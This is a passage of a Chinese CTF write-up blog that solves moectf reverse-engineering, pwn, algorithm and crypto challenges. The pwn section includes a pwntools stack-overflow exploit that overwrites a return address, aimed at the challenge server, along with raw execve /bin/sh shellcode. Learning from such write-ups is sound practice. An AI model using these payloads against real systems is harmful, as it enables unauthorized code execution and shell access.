class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">30</span>; i ++)</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;out[i];</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="05-Protection"><a href="#05-Protection" class="headerlink" title="05 Protection"></a>05 Protection</h2><h3 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h3><p>查壳，脱壳</p><h3 id="解题过程-2"><a href="#解题过程-2" class="headerlink" title="解题过程"></a>解题过程</h3><ul><li><p>查壳：查到UPX壳</p><p><img src="https://i.loli.net/2020/10/12/9QkFupvYEfDzRwi.png" alt="05-01.png"></p></li><li><p>脱壳：利用UpxUnpacker脱壳</p></li><li><p>IDA,主函数查看伪代码，将输入字符与x中的字符XOR后与y中字符比对。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> y[<span class="number">50</span>] = &#123;<span class="number">0x0C</span>,<span class="number">0x0</span>,<span class="number">0x10</span>,<span class="number">0x15</span>,<span class="number">0x57</span>,<span class="number">0x26</span>,<span class="number">0x5A</span>,<span class="number">0x23</span>,<span class="number">0x40</span>,<span class="number">0x40</span>,<span class="number">0x3E</span>,<span class="number">0x42</span>,<span class="number">0x37</span>,<span class="number">0x30</span>,<span class="number">0x9</span>,<span class="number">0x19</span>,<span class="number">0x3</span>,<span class="number">0x1D</span>,<span class="number">0x50</span>,<span class="number">0x43</span>,<span class="number">0x7</span>,<span class="number">0x57</span>,<span class="number">0x15</span>,<span class="number">0x7E</span>,<span class="number">0x51</span>,<span class="number">0x6D</span>,<span class="number">0x43</span>,<span class="number">0x57</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>&#125;;</span><br><span class="line"><span class="built_in">string</span> c = <span class="string">&quot;aouv#@!V08asdozpnma&amp;*#%!$^&amp;*&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i&lt;=<span class="number">27</span>; ++ i)</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; (c[i] ^ y[i]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="06-Real-EasyPython"><a href="#06-Real-EasyPython" class="headerlink" title="06 Real EasyPython"></a>06 Real EasyPython</h2><h3 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h3><p>反编译pyc</p><h3 id="解题过程-3"><a href="#解题过程-3" class="headerlink" title="解题过程"></a>解题过程</h3><ul><li><p>利用uncompyle反编译pyc，得到py源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python 3.7 (3394)</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="comment"># Compiled at: 1969-12-31 18:00:00</span></span><br><span class="line">key = [<span class="number">115</span>, <span class="number">76</span>, <span class="number">50</span>, <span class="number">116</span>, <span class="number">90</span>, <span class="number">50</span>, <span class="number">116</span>, <span class="number">90</span>, <span class="number">115</span>, <span class="number">110</span>, <span class="number">48</span>, <span class="number">47</span>, <span class="number">87</span>, <span class="number">48</span>, <span class="number">103</span>, <span class="number">50</span>, <span class="number">106</span>, <span class="number">126</span>, <span class="number">90</span>, <span class="number">48</span>, <span class="number">103</span>, <span class="number">116</span>, <span class="number">126</span>, <span class="number">90</span>, <span class="number">85</span>, <span class="number">126</span>, <span class="number">115</span>, <span class="number">110</span>, <span class="number">105</span>, <span class="number">104</span>, <span class="number">35</span>]</span><br><span class="line">print(<span class="string">&#x27;Input your flag: &#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">flag = input()</span><br><span class="line">out = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    out.append(ord(i) &gt;&gt; <span class="number">4</span> ^ ord(i))</span><br><span class="line"><span class="keyword">if</span> len(out) != len(key):</span><br><span class="line">    print(<span class="string">&#x27;TRY AGAIN!&#x27;</span>)</span><br><span class="line">    exit()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(out)):</span><br><span class="line">    <span class="keyword">if</span> out[i] != key[i]:</span><br><span class="line">        print(<span class="string">&#x27;TRY AGAIN!&#x27;</span>)</span><br><span class="line">        exit()</span><br><span class="line">print(<span class="string">&#x27;you are right! the flag is : moectf&#123;%s&#125;&#x27;</span> % flag)</span><br></pre></td></tr></table></figure></li><li><p>解密脚本</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">out = []</span><br><span class="line">key = [<span class="number">115</span>, <span class="number">76</span>, <span class="number">50</span>, <span class="number">116</span>, <span class="number">90</span>, <span class="number">50</span>, <span class="number">116</span>, <span class="number">90</span>, <span class="number">115</span>, <span class="number">110</span>, <span class="number">48</span>, <span class="number">47</span>, <span class="number">87</span>, <span class="number">48</span>, <span class="number">103</span>, <span class="number">50</span>, <span class="number">106</span>, <span class="number">126</span>, <span class="number">90</span>, <span class="number">48</span>, <span class="number">103</span>, <span class="number">116</span>, <span class="number">126</span>, <span class="number">90</span>, <span class="number">85</span>, <span class="number">126</span>, <span class="number">115</span>, <span class="number">110</span>, <span class="number">105</span>, <span class="number">104</span>, <span class="number">35</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> key:</span><br><span class="line">  out.append(i &gt;&gt; <span class="number">4</span> ^ i)</span><br><span class="line"> <span class="keyword">for</span> i <span class="keyword">in</span> out:</span><br><span class="line">    print(chr(i), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="07-RollCall"><a href="#07-RollCall" class="headerlink" title="07 RollCall"></a>07 RollCall</h2><h3 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h3><p><del>这不是一道Re</del> <del>这是一道Misc（确信）</del></p><p>读取DB文件，修改性别为2</p><h3 id="解题过程-4"><a href="#解题过程-4" class="headerlink" title="解题过程"></a>解题过程</h3><p>下载一个sqlite数据库浏览器，打开，修改性别字段的数据为2.</p><p>启动程序即可得到flag</p><h4 id="世界线-2"><a href="#世界线-2" class="headerlink" title="世界线#2"></a>世界线#2</h4><p>PEID查壳，查到<code>.NET obf/license protector - for ver. &lt; 5.0 - Unpack with : de4dot v3.1  2014 - http://github.com/0xd4d/de4dot</code></p><p>利用de4dot脱壳，之后用Reflector逆向，得到C#伪代码</p><p>找到了关键函数。<del>（然后就不会了）</del></p><hr><h2 id="08-RxEncode"><a href="#08-RxEncode" class="headerlink" title="08 RxEncode"></a>08 RxEncode</h2><h3 id="解题思路-6"><a href="#解题思路-6" class="headerlink" title="解题思路"></a>解题思路</h3><p>换表base64</p><h3 id="解题过程-5"><a href="#解题过程-5" class="headerlink" title="解题过程"></a>解题过程</h3><h4 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h4><ul><li><p>main:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">*(_QWORD *)s2 = <span class="number">0x4AD158FEB59C879A</span>LL;</span><br><span class="line">  v15 = <span class="number">0xCBEBFDFA6CED0BFE</span>LL;</span><br><span class="line">  v16 = <span class="number">0x7A47A38E43A334E8</span>LL;</span><br><span class="line">  v17 = <span class="number">4L</span>L;</span><br><span class="line">  v18 = <span class="number">0</span>;</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%33s&quot;</span>, &amp;s);</span><br><span class="line">  s1 = (<span class="keyword">char</span> *)RxEncode(&amp;s, <span class="number">33</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(&amp;s) == <span class="number">32</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, s2) )</span><br><span class="line">      v12 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Congratulations!&quot;</span>, v11);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v12 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Wrong!&quot;</span>, v11);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v12, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">    <span class="built_in">std</span>::istream::get((<span class="built_in">std</span>::istream *)&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>);</span><br><span class="line">    <span class="built_in">std</span>::istream::get((<span class="built_in">std</span>::istream *)&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>RxEncode(flag)应该就是s2。</p><p>s2是用小端序存储的字符串，转换成大端序是<code>\x9A\x87\x9C\xB5\xFE\x58\xD1\x4A\xFE\x0B\xED\x6C\xFA\xFD\xEB\xCB\xE8\x34\xA3\x43\x8E\xA3\x47\x7A</code></p></li><li><p>RxEncode:</p><p>base64加密</p></li><li><p>find_pos:</p><p>换表后的base64码<code>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz01234&#123;&#125;789+/</code></p></li></ul><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">str1 = <span class="string">b&#x27;\x9A\x87\x9C\xB5\xFE\x58\xD1\x4A\xFE\x0B\xED\x6C\xFA\xFD\xEB\xCB\xE8\x34\xA3\x43\x8E\xA3\x47\x7A&#x27;</span></span><br><span class="line">flag = str(base64.b64encode(str1)).replace(<span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>).replace(<span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><hr><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="03-Baby-pwn"><a href="#03-Baby-pwn" class="headerlink" title="03 Baby pwn"></a>03 Baby pwn</h2><h3 id="解题思路-7"><a href="#解题思路-7" class="headerlink" title="解题思路"></a>解题思路</h3><p>用backdoor的地址覆盖返回地址</p><h3 id="解题过程-6"><a href="#解题过程-6" class="headerlink" title="解题过程"></a>解题过程</h3><ul><li><p>IDA读主函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">; __unwind &#123;</span><br><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">sub     rsp, 50h</span><br><span class="line">mov     [rbp+var_44], edi</span><br><span class="line">mov     [rbp+var_50], rsi</span><br><span class="line">mov     rax, cs:stdin@@GLIBC_2_2_5</span><br><span class="line">mov     ecx, 0          ; n</span><br><span class="line">mov     edx, 2          ; modes</span><br><span class="line">mov     esi, 0          ; buf</span><br><span class="line">mov     rdi, rax        ; stream</span><br><span class="line">call    _setvbuf</span><br><span class="line">mov     rax, cs:__bss_start</span><br><span class="line">mov     ecx, 0          ; n</span><br><span class="line">mov     edx, 2          ; modes</span><br><span class="line">mov     esi, 0          ; buf</span><br><span class="line">mov     rdi, rax        ; stream</span><br><span class="line">call    _setvbuf</span><br><span class="line">mov     edi, offset format ; &quot;Tell me your name: &quot;</span><br><span class="line">mov     eax, 0</span><br><span class="line">call    _printf</span><br><span class="line">lea     rax, [rbp+var_40]</span><br><span class="line">mov     rsi, rax</span><br><span class="line">mov     edi, offset aS  ; &quot;%s&quot;</span><br><span class="line">mov     eax, 0</span><br><span class="line">call    _scanf</span><br><span class="line">lea     rax, [rbp+var_40]</span><br><span class="line">mov     rsi, rax</span><br><span class="line">mov     edi, offset aHelloS ; &quot;Hello %s!&quot;</span><br><span class="line">mov     eax, 0</span><br><span class="line">call    _printf</span><br><span class="line">mov     eax, 0</span><br><span class="line">leave</span><br><span class="line">retn</span><br><span class="line">; &#125; &#x2F;&#x2F; starts at 400687</span><br><span class="line">main endp</span><br></pre></td></tr></table></figure><p>发现程序为char4开了0x50的内存，而scanf没有输入限制。</p></li><li><p>构造payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&quot;sec.eqqie.cn&quot;</span>,<span class="string">&quot;10003&quot;</span>)</span><br><span class="line">sys_dir=p64(<span class="number">0x400676</span>)</span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x48</span>+sys_dir</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="04-Baby-shellcode"><a href="#04-Baby-shellcode" class="headerlink" title="04 Baby shellcode"></a>04 Baby shellcode</h2><h3 id="解题思路-8"><a href="#解题思路-8" class="headerlink" title="解题思路"></a>解题思路</h3><p>上shell就完了</p><h3 id="解题过程-7"><a href="#解题过程-7" class="headerlink" title="解题过程"></a>解题过程</h3><ul><li><p>IDA</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">public _start</span><br><span class="line">_start proc near</span><br><span class="line">xor     eax, eax</span><br><span class="line">mov     edx, 18h        ; len</span><br><span class="line">mov     ecx, offset msg ; addr</span><br><span class="line">mov     ebx, 1          ; fd</span><br><span class="line">mov     eax, 4</span><br><span class="line">int     80h             ; LINUX - sys_write</span><br><span class="line">sub     esp, 100h</span><br><span class="line">mov     ebx, 0          ; fd</span><br><span class="line">mov     ecx, esp        ; addr</span><br><span class="line">mov     edx, 100h       ; len</span><br><span class="line">mov     eax, 3</span><br><span class="line">int     80h             ; LINUX - sys_read</span><br><span class="line">jmp     esp</span><br><span class="line">_start endp</span><br></pre></td></tr></table></figure><p>sys_read可以读入0x100的数据</p></li></ul><ul><li><p>在shell-strom找一个0x100以内的shellcode</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\<span class="selector-tag">x31</span>\<span class="selector-tag">xc0</span>\<span class="selector-tag">x48</span>\<span class="selector-tag">xbb</span>\<span class="selector-tag">xd1</span>\<span class="selector-tag">x9d</span>\<span class="selector-tag">x96</span>\<span class="selector-tag">x91</span>\<span class="selector-tag">xd0</span>\<span class="selector-tag">x8c</span>\<span class="selector-tag">x97</span>\<span class="selector-tag">xff</span>\<span class="selector-tag">x48</span>\<span class="selector-tag">xf7</span>\<span class="selector-tag">xdb</span>\<span class="selector-tag">x53</span>\<span class="selector-tag">x54</span>\<span class="selector-tag">x5f</span>\<span class="selector-tag">x99</span>\<span class="selector-tag">x52</span>\<span class="selector-tag">x57</span>\<span class="selector-tag">x54</span>\<span class="selector-tag">x5e</span>\<span class="selector-tag">xb0</span>\<span class="selector-tag">x3b</span>\<span class="selector-tag">x0f</span>\<span class="selector-tag">x05</span></span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="05-unusual-shellcode"><a href="#05-unusual-shellcode" class="headerlink" title="05 unusual shellcode"></a>05 unusual shellcode</h2><h3 id="解题思路-9"><a href="#解题思路-9" class="headerlink" title="解题思路"></a>解题思路</h3><p>纯数字字母shellcode</p><h3 id="解题过程-8"><a href="#解题过程-8" class="headerlink" title="解题过程"></a>解题过程</h3><ul><li><p>IDA</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4095</span>; ++i )</span><br><span class="line">&#123;</span><br><span class="line">    v6 = read(<span class="number">0</span>, &amp;buf, <span class="number">1u</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( v6 == <span class="number">-1</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">isalnum</span>(buf) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    *((_BYTE *)v7 + i) = buf;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( mprotect((<span class="keyword">void</span> *)(<span class="keyword">signed</span> <span class="keyword">int</span>)((<span class="keyword">unsigned</span> <span class="keyword">int</span>)v7 &amp; <span class="number">0xFFFFF000</span>), <span class="number">0x1000</span>uLL, <span class="number">7</span>) == <span class="number">-1</span> )</span><br></pre></td></tr></table></figure><p>关键代码：<code>if(!isalnum(buf))</code></p><p>输入必须是纯数字字母</p></li><li><p>利用alpha3生成纯数字字母shellcode</p></li></ul><hr><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="01-mess"><a href="#01-mess" class="headerlink" title="01 mess"></a>01 mess</h2><h3 id="解题思路-10"><a href="#解题思路-10" class="headerlink" title="解题思路"></a>解题思路</h3><p>工具人解法<del>（也挺快）</del></p><h3 id="解题过程-9"><a href="#解题过程-9" class="headerlink" title="解题过程"></a>解题过程</h3><p>删掉字母，手动分ascii码，ascii转字符工具</p><hr><h2 id="02-Frank-永远滴神"><a href="#02-Frank-永远滴神" class="headerlink" title="02 Frank, 永远滴神"></a>02 Frank, 永远滴神</h2><h3 id="解题思路-11"><a href="#解题思路-11" class="headerlink" title="解题思路"></a>解题思路</h3><p>偷懒，省事，直接用工具</p><h3 id="解题过程-10"><a href="#解题过程-10" class="headerlink" title="解题过程"></a>解题过程</h3><p><img src="https://i.loli.net/2020/10/13/MTyZm4YlgSLDNpW.png" alt="image-20200921210117147.png"></p><hr><h2 id="03-赤道企鹅-永远滴神"><a href="#03-赤道企鹅-永远滴神" class="headerlink" title="03 赤道企鹅, 永远滴神"></a>03 赤道企鹅, 永远滴神</h2><h3 id="解题思路-12"><a href="#解题思路-12" class="headerlink" title="解题思路"></a>解题思路</h3><p><del>eqqie，yyds！</del></p><p>python脚本遍历目录&amp;文件+条件判断</p><h3 id="解题过程-11"><a href="#解题过程-11" class="headerlink" title="解题过程"></a>解题过程</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">walk</span>(<span class="params">folder</span>):</span></span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> os.walk(folder):</span><br><span class="line">        <span class="keyword">if</span> files:</span><br><span class="line">            <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">                num += find(os.path.join(root, file).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find</span>(<span class="params">path</span>):</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">with</span> open(path) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.readline()</span><br><span class="line">        <span class="keyword">if</span> content[:<span class="number">8</span>] == <span class="string">&#x27;EqqieNB!&#x27;</span>: <span class="comment"># EqqieNB!</span></span><br><span class="line">            last_is = <span class="number">0</span>  <span class="comment"># 0-&gt;符号，1-&gt;字母，数字</span></span><br><span class="line">            <span class="keyword">for</span> each <span class="keyword">in</span> content[<span class="number">8</span>:]:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;a&#x27;</span> &lt;= each &lt;= <span class="string">&#x27;z&#x27;</span> <span class="keyword">or</span> <span class="string">&#x27;A&#x27;</span> &lt;= each &lt;= <span class="string">&#x27;Z&#x27;</span> <span class="keyword">or</span> <span class="string">&#x27;0&#x27;</span> &lt;= each &lt;= <span class="string">&#x27;9&#x27;</span>:</span><br><span class="line">                    <span class="keyword">if</span> last_is == <span class="number">0</span>:</span><br><span class="line">                        count += <span class="number">1</span></span><br><span class="line">                        last_is = <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    last_is = <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> count</span><br><span class="line"></span><br><span class="line">print(walk(<span class="string">&#x27;puzzle&#x27;</span>))</span><br><span class="line">print(<span class="string">&quot;\033[1;35mDo U know that EqqieNB?&#x27;\033[0m&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="04-千层饼"><a href="#04-千层饼" class="headerlink" title="04 千层饼"></a>04 千层饼</h2><h3 id="解题思路-13"><a href="#解题思路-13" class="headerlink" title="解题思路"></a>解题思路</h3><p><del>手撕</del>  半自动脚本</p><p><del>后来写了全自动脚本</del></p><h3 id="解题过程-12"><a href="#解题过程-12" class="headerlink" title="解题过程"></a>解题过程</h3><ul><li><p>查看py脚本，<code>eqqie_is_god</code>前面的是用base16/base32/base64/base85/ascii85其中一种编码后的0-4之间的数字。</p></li><li><p>写一个半自动 <del>手动</del> 脚本，手动提取<code>eqqie_is_god</code>之前的字符，解码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">alg = [b16decode, b32decode, b64decode, a85decode, b85decode]</span><br><span class="line">a = int(input(<span class="string">&#x27;Input encrypt method:&#x27;</span>))</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> fi:</span><br><span class="line">    origin = fi.read()</span><br><span class="line">sb = bytes(origin, encoding = <span class="string">&quot;utf8&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> fo:</span><br><span class="line">    decoded = alg[a](sb)</span><br><span class="line">    bs = str(decoded, encoding = <span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    fo.write(bs)</span><br></pre></td></tr></table></figure></li></ul><h4 id="世界线2"><a href="#世界线2" class="headerlink" title="世界线2"></a>世界线2</h4><p>后来觉得这解法可能不<del>（yao）</del>太<del>（bei）</del>好<del>（gao）</del>，写了另一个自动脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">alg_encode = [b16encode, b32encode, b64encode, a85encode, b85encode]</span><br><span class="line">alg_decode = [b16decode, b32decode, b64decode, a85decode, b85decode]</span><br><span class="line">dict = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_dict</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">            dict[alg_encode[i](str(j).encode())] = j</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;puzzle.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> fi:</span><br><span class="line">    flag = fi.read()</span><br><span class="line">get_dict()</span><br><span class="line">eqqie = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="string">&#x27;eqqie_is_god&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">    pos = flag.index(<span class="string">&#x27;eqqie_is_god&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;[+]Eqqie told you the encode method:&#x27;</span>, alg_decode[int(dict[flag[:pos].encode()])])</span><br><span class="line">    flag = alg_decode[int(dict[flag[:pos].encode()])](flag[pos + <span class="number">12</span>:]).decode()</span><br><span class="line">    eqqie = eqqie + <span class="number">1</span></span><br><span class="line">    print(<span class="string">&#x27;[+]This is the&#x27;</span>, eqqie, <span class="string">&#x27;time(s) that eqqie told you the encode method&#x27;</span>)</span><br><span class="line">print(<span class="string">&#x27;[!]Eqqie gives you the flag:&#x27;</span>, flag)</span><br></pre></td></tr></table></figure><hr><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="02-easycrypto"><a href="#02-easycrypto" class="headerlink" title="02 easycrypto"></a>02 easycrypto</h2><h3 id="解题思路-14"><a href="#解题思路-14" class="headerlink" 